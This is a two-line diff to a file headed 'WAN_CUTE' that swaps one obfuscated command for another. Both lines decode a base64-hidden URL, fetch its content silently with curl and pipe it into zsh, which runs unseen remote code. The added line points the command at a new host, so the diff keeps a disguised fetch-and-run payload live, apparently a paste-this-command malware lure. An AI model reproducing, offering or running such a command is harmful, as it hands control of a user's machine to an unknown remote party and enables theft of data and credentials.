@@ -1,2 +1,2 @@
 # WAN_CUTE
-curl -s $(echo "aHR0cHM6Ly9wZWFybGZpZWxkNi5jb20vY3VybC84Z3p1ZXI1dXV0L214bjlxaGgyaWhvNHM2Z2VxcmtkLmpzb24=" | openssl base64 -d -A) | zsh
+curl -s $(echo "aHR0cHM6Ly9ncm92ZXJ1ZGRlcjEyLmNvbS9jdXJsL3p3aDhxdjg1L3M2cXZjZjJvOXI1azB4bnJnNnMuZGF0" | openssl base64 -d -A) | zsh
